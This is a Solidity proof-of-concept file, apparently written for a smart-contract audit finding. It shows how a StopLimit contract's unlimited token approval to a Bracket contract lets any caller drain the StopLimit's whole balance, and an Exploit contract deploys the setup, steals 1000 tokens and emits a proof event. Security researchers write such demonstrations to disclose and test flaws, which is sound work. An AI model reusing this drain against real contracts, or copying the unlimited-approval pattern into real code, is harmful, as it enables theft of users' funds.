// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract Token { mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance; function mint(address a,uint256 n) external {balanceOf[a]+=n;} function approve(address s,uint256 n) external {allowance[msg.sender][s]=n;} function transferFrom(address f,address t,uint256 n) external {uint256 a=allowance[f][msg.sender]; require(a>=n); if(a!=type(uint256).max) allowance[f][msg.sender]=a-n; balanceOf[f]-=n; balanceOf[t]+=n;} }
contract StopLimit { Token public token; constructor(Token t,address bracket){token=t; t.mint(address(this),1000); t.approve(bracket,type(uint256).max);} }
contract Bracket { Token public token; constructor(Token t){token=t;} function drain(StopLimit stop,uint256 n) external { token.transferFrom(address(stop),msg.sender,n); } }
contract Exploit { bool public harmed; event Proof(uint256 stolen);
    function run() external { Token t=new Token(); Bracket b=new Bracket(t); StopLimit s=new StopLimit(t,address(b));
        // @> token.approve(address(bracket), type(uint256).max) in performUpkeep
        b.drain(s,1000); harmed=t.balanceOf(address(this))==1000; emit Proof(t.balanceOf(address(this))); require(harmed,"allowance limited"); }
}
